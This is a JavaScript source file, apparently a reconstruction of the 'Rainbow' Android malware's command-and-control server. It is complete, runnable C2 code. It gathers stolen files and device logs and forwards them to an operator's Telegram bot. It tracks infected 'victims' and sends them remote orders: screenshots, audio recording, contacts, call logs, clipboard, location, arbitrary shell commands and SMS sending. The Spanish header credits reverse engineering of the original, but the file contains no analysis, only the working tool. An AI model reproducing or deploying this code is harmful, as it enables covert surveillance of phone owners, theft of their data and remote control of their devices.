const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

/**
 * RECONSTRUCCIÓN INTEGRAL DEL SERVIDOR C2 RAINBOW
 * Basado en el análisis del servidor original ofuscado y archivos Smali.
 */

// Configuración cargada desde el entorno o archivo
let config = { token: "", id: "" };
try {
    config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (e) {
    console.error("Error crítico: No se pudo cargar data.json");
    process.exit(1);
}

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    allowEIO3: true,
    transports: ['polling', 'websocket']
});

const bot = new TelegramBot(config.token, { polling: true });

// Almacenamiento de víctimas y estados (appData en el original)
const victims = {}; 
const appData = new Map(); // Para rastrear pasos: {chatId: {target, action, step}}

app.use(express.json());

// --- GESTIÓN DE SUBIDA DE ARCHIVOS (Ruta /upload) ---
const upload = multer({ storage: multer.memoryStorage() });
app.post('/upload', upload.single('file'), (req, res) => {
    const devId = req.headers['currenttarget'] || "Desconocido";
    if (req.file) {
        bot.sendDocument(config.id, req.file.buffer, {
            caption: `<b>✯ 𝙰𝚛𝚌𝚑𝚒𝚟𝚘 𝚛𝚎𝚌𝚒𝚋𝚒𝚍𝚘 𝚍𝚎:</b> <code>${devId}</code>`,
            parse_mode: 'HTML'
        }, { filename: req.file.originalname });
    }
    res.status(200).send('Done');
});

// --- GESTIÓN DE LOGS (Ruta /text) ---
app.post('/text', (req, res) => {
    const devId = req.headers['currenttarget'] || "Desconocido";
    const content = req.body.text;
    bot.sendMessage(config.id, `<b>✯ 𝙻𝚘𝚐 𝚍𝚎 𝚍𝚒𝚜𝚙𝚘𝚜𝚒𝚝𝚒𝚟𝚘 [${devId}]:</b>\n<pre>${content}</pre>`, { parse_mode: 'HTML' });
    res.status(200).send('Done');
});

// --- COMUNICACIÓN SOCKET (Fiel al Handshake original) ---
io.on('connection', (socket) => {
    const q = socket.handshake.query;
    const h = socket.handshake.headers;

    // Extracción de metadatos tal cual el original
    const deviceId = q.currenttarget || h['currenttarget'];
    const model = q.model || h['model'] || "Android";
    const version = q.version || h['version'] || "N/A";

    if (!deviceId) return socket.disconnect();

    victims[socket.id] = { id: deviceId, model: model, version: version };

    bot.sendMessage(config.id, `<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 ✯</b>\n\n<b>𝚖𝚘𝚍𝚎𝚕:</b> ${model}\n<b>𝚒𝚍:</b> <code>${deviceId}</code>\n<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗:</b> ${version}`, { parse_mode: 'HTML' });

    socket.on('data', (data) => {
        const payload = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
        bot.sendMessage(config.id, `<b>✯ 𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎 𝚏𝚛𝚘𝚖 ${model} ✯</b>\n<pre>${payload}</pre>`, { parse_mode: 'HTML' });
    });

    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            bot.sendMessage(config.id, `<b>❌ 𝙳𝚒𝚜𝚙𝚘𝚜𝚒𝚝𝚒vo 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍:</b> ${victims[socket.id].model}`);
            delete victims[socket.id];
        }
    });
});

// --- TECLADOS EXACTOS (Estructura de server(1).js) ---
const KB_MAIN = [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯'], ['✯ 𝙰𝚌𝚝𝚒𝚘𝚗𝚜 𝚏𝚘𝚛 𝚊𝚕𝚕 ✯']];
const KB_ACTIONS = [
    ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙰𝚞𝚍𝚒𝚘 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚛 ✯'],
    ['✯ 𝙵𝚒𝚕𝚎 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯', '✯ 𝚂𝙼𝚂 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯'],
    ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝙲𝚊𝚕𝚕 𝚕𝚘𝚐𝚜 ✯'],
    ['✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯', '✯ 𝙸𝚗𝚜𝚝𝚊𝚕𝚕𝚎𝚍 𝚊𝚙𝚙𝚜 ✯'],
    ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝚂𝚑𝚎𝚕𝚕 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 ✯'],
    ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 ✯'],
    ['✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
];

// --- PROCESAMIENTO DE MENSAJES TELEGRAM ---
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    if (String(chatId) !== String(config.id)) return;
    const text = msg.text;

    if (text === '/start' || text === '✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
        appData.delete(chatId);
        return bot.sendMessage(chatId, "<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯</b>", {
            parse_mode: 'HTML',
            reply_markup: { keyboard: KB_MAIN, resize_keyboard: true }
        });
    }

    if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
        const list = Object.keys(victims).map(sid => [`${victims[sid].model} (${victims[sid].id})`]);
        if (list.length === 0) return bot.sendMessage(chatId, "No devices connected.");
        list.push(['✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
        return bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 ✯</b>", {
            parse_mode: 'HTML',
            reply_markup: { keyboard: list, resize_keyboard: true }
        });
    }

    // Lógica de selección de víctima
    for (const sid in victims) {
        if (text === `${victims[sid].model} (${victims[sid].id})`) {
            appData.set(chatId, { target: sid });
            return bot.sendMessage(chatId, `<b>✯ 𝙰𝚌𝚝𝚒𝚘𝚗𝚜 𝚏𝚘𝚛 ${victims[sid].model} ✯</b>`, {
                parse_mode: 'HTML',
                reply_markup: { keyboard: KB_ACTIONS, resize_keyboard: true }
            });
        }
    }

    const state = appData.get(chatId);
    if (!state || !state.target) return;

    const socket = io.sockets.sockets.get(state.target);
    if (!socket) {
        bot.sendMessage(chatId, "Device lost connection.");
        return appData.delete(chatId);
    }

    // Gestión de comandos (Traducción literal del Switch ofuscado)
    let payload = null;

    // Primero verificamos si estamos en un "paso" de entrada de datos
    if (state.step) {
        switch (state.step) {
            case 'RECORD':
                payload = { order: 'record-audio', duration: text };
                break;
            case 'SHELL':
                payload = { order: 'shell', command: text };
                break;
            case 'PUSH':
                payload = { order: 'notification', title: 'System Message', text: text };
                break;
            case 'SMS_NUM':
                state.temp_num = text;
                state.step = 'SMS_MSG';
                return bot.sendMessage(chatId, "<b>✯ Enter the message ✯</b>", { parse_mode: 'HTML' });
            case 'SMS_MSG':
                payload = { order: 'send-sms', number: state.temp_num, text: text };
                break;
        }
        delete state.step;
    } else {
        // Switch de comandos principales
        switch (text) {
            case '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯': payload = { order: 'screenshot' }; break;
            case '✯ 𝙵𝚒𝚕𝚎 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯': payload = { order: 'file-explorer', path: '/' }; break;
            case '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯': payload = { order: 'contacts' }; break;
            case '✯ 𝙲𝚊𝚕𝚕 𝚕𝚘𝚐𝚜 ✯': payload = { order: 'calls' }; break;
            case '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯': payload = { order: 'clipboard' }; break;
            case '✯ 𝙸𝚗𝚜𝚝𝚊𝚕𝚕𝚎𝚍 𝚊𝚙𝚙𝚜 ✯': payload = { order: 'apps' }; break;
            case '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯': payload = { order: 'vibrate' }; break;
            case '✯ 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 ✯': payload = { order: 'location' }; break;
            case '✯ 𝙰𝚞𝚍𝚒𝚘 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚛 ✯':
                state.step = 'RECORD';
                return bot.sendMessage(chatId, "<b>✯ Enter duration (seconds) ✯</b>", { parse_mode: 'HTML' });
            case '✯ 𝚂𝚑𝚎𝚕𝚕 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 ✯':
                state.step = 'SHELL';
                return bot.sendMessage(chatId, "<b>✯ Enter shell command ✯</b>", { parse_mode: 'HTML' });
            case '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯':
                state.step = 'PUSH';
                return bot.sendMessage(chatId, "<b>✯ Enter notification text ✯</b>", { parse_mode: 'HTML' });
            case '✯ 𝚂𝙼𝚂 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯':
                state.step = 'SMS_NUM';
                return bot.sendMessage(chatId, "<b>✯ Enter phone number ✯</b>", { parse_mode: 'HTML' });
        }
    }

    if (payload) {
        // EL SECRETO: El servidor original emite el objeto directamente bajo 'data'
        socket.emit('data', payload);
        bot.sendMessage(chatId, `🚀 𝙾𝚛𝚍𝚎𝚛 𝚜𝚎𝚗𝚝: <code>${payload.order}</code>`, { parse_mode: 'HTML' });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`C2 Server running on port ${PORT}`));
